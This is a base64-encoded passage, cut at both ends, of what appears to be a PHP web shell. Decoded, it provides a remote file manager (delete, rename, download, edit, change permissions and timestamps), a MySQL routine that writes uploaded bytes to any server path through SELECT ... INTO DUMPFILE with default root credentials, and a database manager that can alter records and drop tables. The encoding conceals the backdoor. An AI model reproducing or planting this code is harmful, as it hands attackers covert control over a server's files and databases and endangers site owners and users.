iamF2YXNjcmlwdDpkb2ZpbGUoXCdkZWxkaXJcJyxcJycuJGRpcmRiWydzZXJ2ZXJfbGluayddLidcJyxcJ0FyZSB5b3Ugc3VyZSB3aWxsIGRlbGV0ZSAnLiRkaXJkYlsnZmlsZW5hbWUnXS4nPyBcXG5cXG5JZiBub24tZW1wdHkgZGlyZWN0b3J5LCB3aWxsIGJlIGRlbGV0ZSBhbGwgdGhlIGZpbGVzLlwnKSI+RGVsPC9hPiB8IDxhIGhyZWY9ImphdmFzY3JpcHQ6cmVuYW1lKFwnJy4kZGlyZGJbJ3NlcnZlcl9saW5rJ10uJ1wnKTsiPlJlbmFtZTwvYT48L3RkPicpOwoJCQlwKCc8L3RyPicpOwoJCQkkZGlyX2krKzsKCQl9IGVsc2UgewoJCQlpZigkZGlyZGJbJ2ZpbGVuYW1lJ109PScuLicpIHsKCQkJCXAoJzx0ciBjbGFzcz1mb3V0PicpOwoJCQkJcCgnPHRkIGFsaWduPSJjZW50ZXIiPjxmb250IGZhY2U9IldpbmdkaW5ncyAzIiBzaXplPTQ+PTwvZm9udD48L3RkPjx0ZCBub3dyYXAgY29sc3Bhbj0iNSI+PGEgaHJlZj0iamF2YXNjcmlwdDpnb2RpcihcJycuZ2V0VXBQYXRoKCRub3dwYXRoKS4nXCcpOyI+UGFyZW50IERpcmVjdG9yeTwvYT48L3RkPicpOwoJCQkJcCgnPC90cj4nKTsKCQkJfQoJCX0KCX0KCglwKCc8dHIgYmdjb2xvcj0iZ3JlZW4iIHN0bHllPSJib3JkZXItdG9wOjFweCBzb2xpZCBncmF5O2JvcmRlci1ib3R0b206MXB4IHNvbGlkIGdyYXk7Ij48dGQgY29sc3Bhbj0iNiIgaGVpZ2h0PSI1Ij48L3RkPjwvdHI+Jyk7CglwKCc8Zm9ybSBpZD0iZmlsZWxpc3QiIG5hbWU9ImZpbGVsaXN0IiBhY3Rpb249IicuJHNlbGYuJyIgbWV0aG9kPSJwb3N0Ij4nKTsKCW1ha2VoaWRlKCdhY3Rpb24nLCdmaWxlJyk7CgltYWtlaGlkZSgndGhlZmlsZScpOwoJbWFrZWhpZGUoJ2RvaW5nJyk7CgltYWtlaGlkZSgnZGlyJywkbm93cGF0aCk7CgkkZmlsZV9pID0gJzAnOwoJZm9yZWFjaCgkZmlsZWRhdGEgYXMgJGtleSA9PiAkZmlsZWRiKXsKCQlpZigkZmlsZWRiWydmaWxlbmFtZSddIT0nLi4nICYmICRmaWxlZGJbJ2ZpbGVuYW1lJ10hPScuJykgewoJCQkkZmlsZXVybCA9IHN0cl9yZXBsYWNlKFNBX1JPT1QsJycsJGZpbGVkYlsnc2VydmVyX2xpbmsnXSk7CgkJCSR0aGlzYmcgPSBiZygpOwoJCQlwKCc8dHIgY2xhc3M9ImZvdXQiIG9ubW91c2VvdmVyPSJ0aGlzLmNsYXNzTmFtZT1cJ2ZvY3VzXCc7IiBvbm1vdXNlb3V0PSJ0aGlzLmNsYXNzTmFtZT1cJ2ZvdXRcJzsiPicpOwoJCQlwKCc8dGQgd2lkdGg9IjIlIiBub3dyYXA+PGlucHV0IHR5cGU9ImNoZWNrYm94IiB2YWx1ZT0iMSIgbmFtZT0iZGxbJy4kZmlsZWRiWydzZXJ2ZXJfbGluayddLiddIj48L3RkPicpOwoJCQlwKCc8dGQ+PGEgaHJlZj0iJy4kZmlsZXVybC4nIiB0YXJnZXQ9Il9ibGFuayI+Jy4kZmlsZWRiWydmaWxlbmFtZSddLic8L2E+PC90ZD4nKTsKCQkJcCgnPHRkIG5vd3JhcD4nLiRmaWxlZGJbJ210aW1lJ10uJzwvdGQ+Jyk7CgkJCXAoJzx0ZCBub3dyYXA+Jy4kZmlsZWRiWydzaXplJ10uJzwvdGQ+Jyk7CgkJCXAoJzx0ZCBub3dyYXA+Jyk7CgkJCXAoJzxhIGhyZWY9ImphdmFzY3JpcHQ6ZmlsZXBlcm0oXCcnLiRmaWxlZGJbJ3NlcnZlcl9saW5rJ10uJ1wnKTsiPicuJGZpbGVkYlsnZmlsZWNobW9kJ10uJzwvYT4gLyAnKTsKCQkJcCgnPGEgaHJlZj0iamF2YXNjcmlwdDpmaWxlcGVybShcJycuJGZpbGVkYlsnc2VydmVyX2xpbmsnXS4nXCcpOyI+Jy4kZmlsZWRiWydmaWxlcGVybSddLic8L2E+Jy4kZmlsZWRiWydmaWxlb3duZXInXS4nPC90ZD4nKTsKCQkJcCgnPHRkIG5vd3JhcD4nKTsKCQkJcCgnPGEgaHJlZj0iamF2YXNjcmlwdDpkb2ZpbGUoXCdkb3duZmlsZVwnLFwnJy4kZmlsZWRiWydzZXJ2ZXJfbGluayddLidcJyk7Ij5Eb3duPC9hPiB8ICcpOwoJCQlwKCc8YSBocmVmPSJqYXZhc2NyaXB0OmNvcHlmaWxlKFwnJy4kZmlsZWRiWydzZXJ2ZXJfbGluayddLidcJyk7Ij5Db3B5PC9hPiB8ICcpOwoJCQlwKCc8YSBocmVmPSJqYXZhc2NyaXB0Om9wZmlsZShcJ2VkaXRmaWxlXCcsXCcnLiRmaWxlZGJbJ3NlcnZlcl9saW5rJ10uJ1wnLFwnJy4kZmlsZWRiWydkaXJsaW5rJ10uJ1wnKTsiPkVkaXQ8L2E+IHwgJyk7CgkJCXAoJzxhIGhyZWY9ImphdmFzY3JpcHQ6cmVuYW1lKFwnJy4kZmlsZWRiWydzZXJ2ZXJfbGluayddLidcJyk7Ij5SZW5hbWU8L2E+IHwgJyk7CgkJCXAoJzxhIGhyZWY9ImphdmFzY3JpcHQ6b3BmaWxlKFwnbmV3dGltZVwnLFwnJy4kZmlsZWRiWydzZXJ2ZXJfbGluayddLidcJyxcJycuJGZpbGVkYlsnZGlybGluayddLidcJyk7Ij5UaW1lPC9hPicpOwoJCQlwKCc8L3RkPjwvdHI+Jyk7CgkJCSRmaWxlX2krKzsKCQl9Cgl9CglwKCc8dHIgY2xhc3M9ImZvdXQxIj48dGQgYWxpZ249ImNlbnRlciI+PGlucHV0IG5hbWU9ImNoa2FsbCIgdmFsdWU9Im9uIiB0eXBlPSJjaGVja2JveCIgb25jbGljaz0iQ2hlY2tBbGwodGhpcy5mb3JtKSIgLz48L3RkPjx0ZD48YSBocmVmPSJqYXZhc2NyaXB0OmRvZmlsZShcJ2Rvd25yYXJcJyk7Ij5QYWNraW5nIGRvd25sb2FkIHNlbGVjdGVkPC9hPiAtIDxhIGhyZWY9ImphdmFzY3JpcHQ6ZG9maWxlKFwnZGVsZmlsZXNcJyk7Ij5EZWxldGUgc2VsZWN0ZWQ8L2E+PC90ZD48dGQgY29sc3Bhbj0iNCIgYWxpZ249InJpZ2h0Ij4nLiRkaXJfaS4nIGRpcmVjdG9yaWVzIC8gJy4kZmlsZV9pLicgZmlsZXM8L3RkPjwvdHI+Jyk7CglwKCc8L2Zvcm0+PC90YWJsZT4nKTsKfS8vIGVuZCBkaXIKCmVsc2VpZiAoJGFjdGlvbiA9PSAnc3FsZmlsZScpIHsKCWlmKCRkb2luZz09Im15c3FsdXBsb2FkIil7CgkJJGZpbGUgPSAkX0ZJTEVTWyd1cGxvYWRmaWxlJ107CgkJJGZpbGVuYW1lID0gJGZpbGVbJ3RtcF9uYW1lJ107CgkJaWYgKGZpbGVfZXhpc3RzKCRzYXZlcGF0aCkpIHsKCQkJbSgnVGhlIGdvYWwgZmlsZSBoYXMgYWxyZWFkeSBleGlzdGVkJyk7CgkJfSBlbHNlIHsKCQkJaWYoISRmaWxlbmFtZSkgewoJCQkJbSgnUGxlYXNlIGNob29zZSBhIGZpbGUnKTsKCQkJfSBlbHNlIHsKCQkJCSRmcD1AZm9wZW4oJGZpbGVuYW1lLCdyJyk7CgkJCQkkY29udGVudHM9QGZyZWFkKCRmcCwgZmlsZXNpemUoJGZpbGVuYW1lKSk7CgkJCQlAZmNsb3NlKCRmcCk7CgkJCQkkY29udGVudHMgPSBiaW4yaGV4KCRjb250ZW50cyk7CgkJCQlpZighJHVwbmFtZSkgJHVwbmFtZSA9ICRmaWxlWyduYW1lJ107CgkJCQlkYmNvbm4oJGRiaG9zdCwkZGJ1c2VyLCRkYnBhc3MsJGRibmFtZSwkY2hhcnNldCwkZGJwb3J0KTsKCQkJCSRyZXN1bHQgPSBxKCJTRUxFQ1QgMHh7JGNvbnRlbnRzfSBGUk9NIG15c3FsLnVzZXIgSU5UTyBEVU1QRklMRSAnJHNhdmVwYXRoJzsiKTsKCQkJCW0oJHJlc3VsdCA/ICdVcGxvYWQgc3VjY2VzcycgOiAnVXBsb2FkIGhhcyBmYWlsZWQ6ICcubXlzcWxfZXJyb3IoKSk7CgkJCX0KCQl9Cgl9Cj8+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KZnVuY3Rpb24gbXlzcWxmaWxlKGRvaW5nKXsKCWlmKCFkb2luZykgcmV0dXJuOwoJJCgnZG9pbmcnKS52YWx1ZT1kb2luZzsKCSQoJ215c3FsZmlsZScpLmRiaG9zdC52YWx1ZT0kKCdkYmluZm8nKS5kYmhvc3QudmFsdWU7CgkkKCdteXNxbGZpbGUnKS5kYnBvcnQudmFsdWU9JCgnZGJpbmZvJykuZGJwb3J0LnZhbHVlOwoJJCgnbXlzcWxmaWxlJykuZGJ1c2VyLnZhbHVlPSQoJ2RiaW5mbycpLmRidXNlci52YWx1ZTsKCSQoJ215c3FsZmlsZScpLmRicGFzcy52YWx1ZT0kKCdkYmluZm8nKS5kYnBhc3MudmFsdWU7CgkkKCdteXNxbGZpbGUnKS5kYm5hbWUudmFsdWU9JCgnZGJpbmZvJykuZGJuYW1lLnZhbHVlOwoJJCgnbXlzcWxmaWxlJykuY2hhcnNldC52YWx1ZT0kKCdkYmluZm8nKS5jaGFyc2V0LnZhbHVlOwoJJCgnbXlzcWxmaWxlJykuc3VibWl0KCk7Cn0KPC9zY3JpcHQ+Cjw/cGhwCgkhJGRiaG9zdCAmJiAkZGJob3N0ID0gJ2xvY2FsaG9zdCc7CgkhJGRidXNlciAmJiAkZGJ1c2VyID0gJ3Jvb3QnOwoJISRkYnBvcnQgJiYgJGRicG9ydCA9ICczMzA2JzsKCSRjaGFyc2V0cyA9IGFycmF5KCcnPT4nRGVmYXVsdCcsJ2diayc9PidHQksnLCAnYmlnNSc9PidCaWc1JywgJ3V0ZjgnPT4nVVRGLTgnLCAnbGF0aW4xJz0+J0xhdGluMScpOwoJZm9ybWhlYWQoYXJyYXkoJ3RpdGxlJz0+J01ZU1FMIEluZm9ybWF0aW9uJywnbmFtZSc9PidkYmluZm8nKSk7CgltYWtlaGlkZSgnYWN0aW9uJywnc3FsZmlsZScpOwoJcCgnPHA+Jyk7CglwKCdEQkhvc3Q6Jyk7CgltYWtlaW5wdXQoYXJyYXkoJ25hbWUnPT4nZGJob3N0Jywnc2l6ZSc9PjIwLCd2YWx1ZSc9PiRkYmhvc3QpKTsKCXAoJzonKTsKCW1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidkYnBvcnQnLCdzaXplJz0+NCwndmFsdWUnPT4kZGJwb3J0KSk7CglwKCdEQlVzZXI6Jyk7CgltYWtlaW5wdXQoYXJyYXkoJ25hbWUnPT4nZGJ1c2VyJywnc2l6ZSc9PjE1LCd2YWx1ZSc9PiRkYnVzZXIpKTsKCXAoJ0RCUGFzczonKTsKCW1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidkYnBhc3MnLCdzaXplJz0+MTUsJ3ZhbHVlJz0+JGRicGFzcykpOwoJcCgnREJOYW1lOicpOwoJbWFrZWlucHV0KGFycmF5KCduYW1lJz0+J2RibmFtZScsJ3NpemUnPT4xNSwndmFsdWUnPT4kZGJuYW1lKSk7CglwKCdEQkNoYXJzZXQ6Jyk7CgltYWtlc2VsZWN0KGFycmF5KCduYW1lJz0+J2NoYXJzZXQnLCdvcHRpb24nPT4kY2hhcnNldHMsJ3NlbGVjdGVkJz0+JGNoYXJzZXQpKTsKCXAoJzwvcD4nKTsKCWZvcm1mb290KCk7CglwKCc8Zm9ybSBhY3Rpb249IicuJHNlbGYuJyIgbWV0aG9kPSJQT1NUIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBuYW1lPSJteXNxbGZpbGUiIGlkPSJteXNxbGZpbGUiPicpOwoJcCgnPGgyPlVwbG9hZCBmaWxlPC9oMj4nKTsKCXAoJzxwPjxiPlRoaXMgb3BlcmF0aW9uIHRoZSBEQiB1c2VyIG11c3QgaGFzIEZJTEUgcHJpdmlsZWdlPC9iPjwvcD4nKTsKCXAoJzxwPlNhdmUgcGF0aChmdWxscGF0aCk6IDxpbnB1dCBjbGFzcz0iaW5wdXQiIG5hbWU9InNhdmVwYXRoIiBzaXplPSI0NSIgdHlwZT0idGV4dCIgLz4gQ2hvb3NlIGEgZmlsZTogPGlucHV0IGNsYXNzPSJpbnB1dCIgbmFtZT0idXBsb2FkZmlsZSIgdHlwZT0iZmlsZSIgLz4gPGEgaHJlZj0iamF2YXNjcmlwdDpteXNxbGZpbGUoXCdteXNxbHVwbG9hZFwnKTsiPlVwbG9hZDwvYT48L3A+Jyk7CglwKCc8aDI+RG93bmxvYWQgZmlsZTwvaDI+Jyk7CglwKCc8cD5GaWxlOiA8aW5wdXQgY2xhc3M9ImlucHV0IiBuYW1lPSJteXNxbGRsZmlsZSIgc2l6ZT0iMTE1IiB0eXBlPSJ0ZXh0IiAvPiA8YSBocmVmPSJqYXZhc2NyaXB0Om15c3FsZmlsZShcJ215c3FsZG93blwnKTsiPkRvd25sb2FkPC9hPjwvcD4nKTsKCW1ha2VoaWRlKCdkYmhvc3QnKTsKCW1ha2VoaWRlKCdkYnBvcnQnKTsKCW1ha2VoaWRlKCdkYnVzZXInKTsKCW1ha2VoaWRlKCdkYnBhc3MnKTsKCW1ha2VoaWRlKCdkYm5hbWUnKTsKCW1ha2VoaWRlKCdjaGFyc2V0Jyk7CgltYWtlaGlkZSgnZG9pbmcnKTsKCW1ha2VoaWRlKCdhY3Rpb24nLCdzcWxmaWxlJyk7CglwKCc8L2Zvcm0+Jyk7Cn0KCmVsc2VpZiAoJGFjdGlvbiA9PSAnc3FsYWRtaW4nKSB7CgkhJGRiaG9zdCAmJiAkZGJob3N0ID0gJ2xvY2FsaG9zdCc7CgkhJGRidXNlciAmJiAkZGJ1c2VyID0gJ3Jvb3QnOwoJISRkYnBvcnQgJiYgJGRicG9ydCA9ICczMzA2JzsKCSRkYmZvcm0gPSAnPGlucHV0IHR5cGU9ImhpZGRlbiIgaWQ9ImNvbm5lY3QiIG5hbWU9ImNvbm5lY3QiIHZhbHVlPSIxIiAvPic7CglpZihpc3NldCgkZGJob3N0KSl7CgkJJGRiZm9ybSAuPSAiPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBpZD1cImRiaG9zdFwiIG5hbWU9XCJkYmhvc3RcIiB2YWx1ZT1cIiRkYmhvc3RcIiAvPlxuIjsKCX0KCWlmKGlzc2V0KCRkYnVzZXIpKSB7CgkJJGRiZm9ybSAuPSAiPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBpZD1cImRidXNlclwiIG5hbWU9XCJkYnVzZXJcIiB2YWx1ZT1cIiRkYnVzZXJcIiAvPlxuIjsKCX0KCWlmKGlzc2V0KCRkYnBhc3MpKSB7CgkJJGRiZm9ybSAuPSAiPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBpZD1cImRicGFzc1wiIG5hbWU9XCJkYnBhc3NcIiB2YWx1ZT1cIiRkYnBhc3NcIiAvPlxuIjsKCX0KCWlmKGlzc2V0KCRkYnBvcnQpKSB7CgkJJGRiZm9ybSAuPSAiPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBpZD1cImRicG9ydFwiIG5hbWU9XCJkYnBvcnRcIiB2YWx1ZT1cIiRkYnBvcnRcIiAvPlxuIjsKCX0KCWlmKGlzc2V0KCRkYm5hbWUpKSB7CgkJJGRiZm9ybSAuPSAiPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBpZD1cImRibmFtZVwiIG5hbWU9XCJkYm5hbWVcIiB2YWx1ZT1cIiRkYm5hbWVcIiAvPlxuIjsKCX0KCWlmKGlzc2V0KCRjaGFyc2V0KSkgewoJCSRkYmZvcm0gLj0gIjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgaWQ9XCJjaGFyc2V0XCIgbmFtZT1cImNoYXJzZXRcIiB2YWx1ZT1cIiRjaGFyc2V0XCIgLz5cbiI7Cgl9CgoJaWYgKCRkb2luZyA9PSAnYmFja3VwbXlzcWwnICYmICRzYXZlYXNmaWxlKSB7CgkJaWYgKCEkdGFibGUpIHsKCQkJbSgnUGxlYXNlIGNob29zZSB0aGUgdGFibGUnKTsKCQl9IGVsc2UgewoJCQlkYmNvbm4oJGRiaG9zdCwkZGJ1c2VyLCRkYnBhc3MsJGRibmFtZSwkY2hhcnNldCwkZGJwb3J0KTsKCQkJJHRhYmxlID0gYXJyYXlfZmxpcCgkdGFibGUpOwoJCQkkZnAgPSBAZm9wZW4oJHBhdGgsJ3cnKTsKCQkJaWYgKCRmcCkgewoJCQkJJHJlc3VsdCA9IHEoJ1NIT1cgdGFibGVzJyk7CgkJCQlpZiAoISRyZXN1bHQpIHAoJzxoMj4nLm15c3FsX2Vycm9yKCkuJzwvaDI+Jyk7CgkJCQkkbXlzcWxkYXRhID0gJyc7CgkJCQl3aGlsZSAoJGN1cnJvdyA9IG15c3FsX2ZldGNoX2FycmF5KCRyZXN1bHQpKSB7CgkJCQkJaWYgKGlzc2V0KCR0YWJsZVskY3Vycm93WzBdXSkpIHsKCQkJCQkJc3FsZHVtcHRhYmxlKCRjdXJyb3dbMF0sICRmcCk7CgkJCQkJfQoJCQkJfQoJCQkJZmNsb3NlKCRmcCk7CgkJCQkkZmlsZXVybCA9IHN0cl9yZXBsYWNlKFNBX1JPT1QsJycsJHBhdGgpOwoJCQkJbSgnRGF0YWJhc2UgaGFzIHN1Y2Nlc3MgYmFja3VwIHRvIDxhIGhyZWY9IicuJGZpbGV1cmwuJyIgdGFyZ2V0PSJfYmxhbmsiPicuJHBhdGguJzwvYT4nKTsKCQkJCW15c3FsX2Nsb3NlKCk7CgkJCX0gZWxzZSB7CgkJCQltKCdCYWNrdXAgZmFpbGVkJyk7CgkJCX0KCQl9Cgl9CglpZiAoJGluc2VydCAmJiAkaW5zZXJ0c3FsKSB7CgkJJGtleXN0ciA9ICR2YWxzdHIgPSAkdG1wID0gJyc7CgkJZm9yZWFjaCgkaW5zZXJ0c3FsIGFzICRrZXkgPT4gJHZhbCkgewoJCQlpZiAoJHZhbCkgewoJCQkJJGtleXN0ciAuPSAkdG1wLiRrZXk7CgkJCQkkdmFsc3RyIC49ICR0bXAuIiciLmFkZHNsYXNoZXMoJHZhbCkuIiciOwoJCQkJJHRtcCA9ICcsJzsKCQkJfQoJCX0KCQlpZiAoJGtleXN0ciAmJiAkdmFsc3RyKSB7CgkJCWRiY29ubigkZGJob3N0LCRkYnVzZXIsJGRicGFzcywkZGJuYW1lLCRjaGFyc2V0LCRkYnBvcnQpOwoJCQltKHEoIklOU0VSVCBJTlRPICR0YWJsZW5hbWUgKCRrZXlzdHIpIFZBTFVFUyAoJHZhbHN0cikiKSA/ICdJbnNlcnQgbmV3IHJlY29yZCBvZiBzdWNjZXNzJyA6IG15c3FsX2Vycm9yKCkpOwoJCX0KCX0KCWlmICgkdXBkYXRlICYmICRpbnNlcnRzcWwgJiYgJGJhc2U2NCkgewoJCSR2YWxzdHIgPSAkdG1wID0gJyc7CgkJZm9yZWFjaCgkaW5zZXJ0c3FsIGFzICRrZXkgPT4gJHZhbCkgewoJCQkkdmFsc3RyIC49ICR0bXAuJGtleS4iPSciLmFkZHNsYXNoZXMoJHZhbCkuIiciOwoJCQkkdG1wID0gJywnOwoJCX0KCQlpZiAoJHZhbHN0cikgewoJCQkkd2hlcmUgPSBiYXNlNjRfZGVjb2RlKCRiYXNlNjQpOwoJCQlkYmNvbm4oJGRiaG9zdCwkZGJ1c2VyLCRkYnBhc3MsJGRibmFtZSwkY2hhcnNldCwkZGJwb3J0KTsKCQkJbShxKCJVUERBVEUgJHRhYmxlbmFtZSBTRVQgJHZhbHN0ciBXSEVSRSAkd2hlcmUgTElNSVQgMSIpID8gJ1JlY29yZCB1cGRhdGluZycgOiBteXNxbF9lcnJvcigpKTsKCQl9Cgl9CglpZiAoJGRvaW5nID09ICdkZWwnICYmICRiYXNlNjQpIHsKCQkkd2hlcmUgPSBiYXNlNjRfZGVjb2RlKCRiYXNlNjQpOwoJCSRkZWxldGVfc3FsID0gIkRFTEVURSBGUk9NICR0YWJsZW5hbWUgV0hFUkUgJHdoZXJlIjsKCQlkYmNvbm4oJGRiaG9zdCwkZGJ1c2VyLCRkYnBhc3MsJGRibmFtZSwkY2hhcnNldCwkZGJwb3J0KTsKCQltKHEoIkRFTEVURSBGUk9NICR0YWJsZW5hbWUgV0hFUkUgJHdoZXJlIikgPyAnRGVsZXRpb24gcmVjb3JkIG9mIHN1Y2Nlc3MnIDogbXlzcWxfZXJyb3IoKSk7Cgl9CgoJaWYgKCR0YWJsZW5hbWUgJiYgJGRvaW5nID09ICdkcm9wJykgewoJCWRiY29ubigkZGJob3N0LCRkYnVzZXIsJGRicGFzcywkZGJuYW1lLCRjaGFyc2V0LCRkYnBvcnQpOwoJCWlmIChxKCJEUk9QIFRBQkxFICR0YWJsZW5hbWUiKSkgewoJCQltKCdEcm9wIHRhYmxlIG9mIHN1Y2Nlc3MnKTsKCQkJJHRhYmxlbmFtZSA9ICcnOwoJCX0gZWxzZSB7CgkJCW0obXlzcWxfZXJyb3IoKSk7CgkJfQoJfQoKCSRjaGFyc2V0cyA9IGFycmF5KCcnPT4nRGVmYXVsdCcsJ2diayc9PidHQksnLCAnYmlnNSc9PidCaWc1JywgJ3V0ZjgnPT4nVVRGLTgnLCAnbGF0aW4xJz0+J0xhdGluMScpOwoKCWZvcm1oZWFkKGFycmF5KCd0aXRsZSc9PidNWVNRTCBNYW5hZ2VyJykpOwoJbWFrZWhpZGUoJ2FjdGlvbicsJ3NxbGFkbWluJyk7CglwKCc8cD4nKTsKCXAoJ0RCSG9zdDonKTsKCW1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidkYmhvc3QnLCdzaXplJz0+MjAsJ3ZhbHVlJz0+JGRiaG9zdCkpOwoJcCgnOicpOwoJbWFrZWlucHV0KGFycmF5KCduYW1lJz0+J2RicG9ydCcsJ3NpemUnPT40LCd2YWx1ZSc9PiRkYnBvcnQpKTsKCXAoJ0RCVXNlcjonKTsKCW1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidkYnVzZXInLCdzaXplJz0+MTUsJ3ZhbHVlJz0+JGRidXNlcikpOwoJcCgnREJQYXNzOicpOwoJbWFrZWlucHV0KGFycmF5KCduYW1lJz0+J2RicGFzcycsJ3NpemUnPT4xNSwndmFsdWUnPT4kZGJwYXNzKSk7CglwKCdEQkNoYXJzZXQ6Jyk7CgltYWtlc2VsZWN0KGFycmF5KCduYW1lJz0+J2NoYXJzZXQnLCdvcHRpb24nPT4kY2hhcnNldHMsJ3NlbGVjdGVkJz0+JGNoYXJzZXQpKTsKCW1ha2VpbnB1dChhcnJheSgnbmFtZSc9Pidjb25uZWN0JywndmFsdWUnPT4nQ29ubmVjdCcsJ3R5cGUnPT4nc3VibWl0JywnY2xhc3MnPT4nYnQnKSk7CglwKCc8L3A+Jyk7Cglmb3JtZm9vdCgpOwo/Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CmZ1bmN0aW9uIGVkaXRyZWNvcmQoYWN0aW9uLCBiYXNlNjQsIHRhYmxlbmFtZSl7CglpZiAoYWN0aW9uID09ICdkZWwnKSB7CgkJaWYgKCFjb25maXJtKCdJcyBvciBpc25cJ3QgZGVsZXRpb24gcmVjb3JkPycpKSByZXR1cm47Cgl9CgkkKCdyZWNvcmRsaXN0JykuZG9pbmcudmFsdWU9YWN0aW9uOwoJJCgncmVjb3JkbGlzdCcpLmJhc2U2NC52YWx1ZT1iYXNlNjQ7CgkkKCdyZWNvcmRsaXN0JykudGFibGVuYW1lLnZhbHVlPXRhYmxlbmFtZTsKCSQoJ3JlY29yZGxpc3QnKS5zdWJtaXQoKTsKfQpmdW5jdGlvbiBtb2RkYm5hbWUoZGJuYW1lKSB7CglpZighZGJuYW1lKSByZXR1cm47CgkkKCdzZXRkYm5hbWUnKS5kYm5hbWUudmFsdWU9ZGJuYW1lOwoJJCgnc2V0ZGJuYW1lJykuc3VibWl0KCk7Cn0KZnVuY3Rpb24gc2V0dGFibGUodGFibGVuYW1lLGRvaW5nLHBhZ2UpIHsKCWlmKCF0YWJsZW5hbWUpIHJldHVybjsKCWlmIChkb2luZykgewoJCSQoJ3NldHRhYmxlJykuZG9pbmcudmFsdWU9ZG9pbmc7Cgl9CglpZiAocGFnZSkgewoJCSQoJ3NldHRhYmxlJykucGFnZS52YWx1ZT1wYWdlOwoJfQoJJCgnc2V0dGFibGUnKS50YWJsZW5hbWUudmFsdWU9dGFibGVuYW1lOwoJJCgnc2V0dGFibGUnKS5zdWJtaXQoKTsKfQo8L3NjcmlwdD4KPD9waHAKCS8vIFNRTAoJZm9ybWhlYWQoYXJyYXkoJ25hbWUnPT4ncmVjb3JkbGlzdCcpKTsKCW1ha2VoaWRlKCdkb2luZycpOwoJbWFrZWhpZGUoJ2FjdGlvbicsJ3NxbGFkbWluJyk7CgltYWtlaGlkZSgnYmFzZTY0Jyk7CgltYWtlaGlkZSgndGFibGVuYW1lJyk7CglwKCRkYmZvcm0pOwoJZm9ybWZvb3QoKTsKCgkvLyBEYXRhCglmb3JtaGVhZChhcnJheSgnbmFtZSc9PidzZXRkYm5hbWUnKSk7CgltYWtlaGlkZSgnYWN0aW9uJywnc3FsYWRtaW4nKTsKCXAoJGRiZm9ybSk7CglpZiAoISRkYm5hbWUpIHsKCQltYWtlaGlkZSgnZGJuYW1lJyk7Cgl9Cglmb3JtZm9vdCgpOwoKCglmb3JtaGVhZChhcnJheSgnbmFtZSc9PidzZXR0YWJsZScpKTsKCW1ha2VoaWRlKCdhY3Rpb24nLCdzcWxhZG1pbicpOwoJcCgkZGJmb3JtKTsKCW1ha2VoaWRlKCd0YWJsZW5hbWUnKTsKCW1ha2VoaWRlKCdwYWdlJywkcGFnZSk7CgltYWtlaGlkZSgnZG9pbmcnKTsKCWZvcm1mb290KCk7CgoJJGNhY2hldGFibGVzID0gYXJyYXkoKTsKCSRwYWdlbnVtID0gMzA7CgkkcGFnZSA9IGludHZhbCgkcGFnZSk7CglpZigkcGFnZSkgewoJCSRzdGFydF9saW1pdCA9ICgkcGFnZSAtIDEpICogJHBhZ2VudW07Cgl9IGVsc2UgewoJCSRzdGFydF9saW1pdCA9IDA7CgkJJHBhZ2UgPSAxOwoJfQoJaWYgKGlzc2V0KCRkYmhvc3QpICYmIGlzc2V0KCRkYnVzZXIpICYmIGlzc2V0KCRkYnBhc3MpICYmIGlzc2V0KCRjb25uZWN0KSkgewoJCWRiY29ubigkZGJob3N0LCAkZGJ1c2VyLCAkZGJwYXNzLCAkZGJuYW1lLCAkY2hhcnNldCwgJGRicG9ydCk7CgkJLy8gZ2V0IG15c3FsIHNlcnZlcgoJCSRteXNxbHZlciA9IG15c3FsX2dldF9zZXJ2ZXJfaW5mbygpOwoJCXAoJzxwPk15U1FMICcuJG15c3FsdmVyLicgcnVubmluZyBpbiAnLiRkYmhvc3QuJyBhcyAnLiRkYnVzZXIuJ0AnLiRkYmhvc3QuJzwvcD4nKTsKCQkkaGlnaHZlciA9ICRteXNxbHZlciA+ICc0LjEnID8gMSA6IDA7CgoJCS8vIFNob3cgZGF0YWJhc2UKCQkkcXVlcnkgPSBxKCJTSE9XIERBVEFCQVNFUyIpOwoJCSRkYnMgPSBhcnJheSgpOwoJCSRkYnNbXSA9ICctLSBTZWxlY3QgYSBkYXRhYmFzZSAtLSc7CgkJd2hpbGUoJGRiID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHF1ZXJ5KSkgewoJCQkkZGJzWyRkYlsnRGF0YWJhc2UnXV0gPSAkZGJbJ0RhdGFiYXNlJ107CgkJfQoJCW1ha2VzZWxlY3QoYXJyYXkoJ3RpdGxlJz0+J1BsZWFzZSBzZWxlY3QgYSBkYXRhYmFzZTonLCduYW1lJz0+J2RiW10nLCdvcHRpb24nPT4kZGJzLCdzZWxlY3RlZCc9PiRkYm5hbWUsJ29uY2hhbmdlJz0+J21vZGRibmFtZSh0aGlzLm9wdGlvbnNbdGhpcy5zZWxlY3RlZEluZGV4XS52YWx1ZSknLCduZXdsaW5lJz0+MSkpOwoJCSR0YWJsZWRiID0gYXJyYXkoKTsKCQlpZiAoJGRibmFtZSkgewoJCQlwKCc8cD4nKTsKCQkJcCgnQ3VycmVudCBkYWJhYmFzZTogPGEgaHJlZj0iamF2YXNjcmlwdDptb2RkYm5hbWUoXCcnLiRkYm5hbWUuJ1wnKTsiPicuJGRibmFtZS4nPC9hPicpOwoJCQlpZiAoJHRhYmxlbmFtZSkgewoJCQkJcCgnIHwgQ3VycmVudCBUYWJsZTogPGEgaHJlZj0iamF2YXNjcmlwdDpzZXR0YWJsZShcJycuJHRhYmxlbmFtZS4nXCcpOyI+Jy4kdGFibGVuYW1lLic8L2E+IFsgPGEgaHJlZj0iamF2YXNjcmlwdDpzZXR0YWJsZShcJycuJHRhYmxlbmFtZS4nXCcsIFwnaW5zZXJ0XCcpOyI+SW5zZXJ0PC9hPiB8IDxhIGhyZWY9ImphdmFzY3JpcHQ6c2V0dGFibGUoXCcnLiR0YWJsZW5hbWUuJ1wnLCBcJ3N0cnVjdHVyZVwnKTsiPlN0cnVjdHVyZTwvYT4gfCA8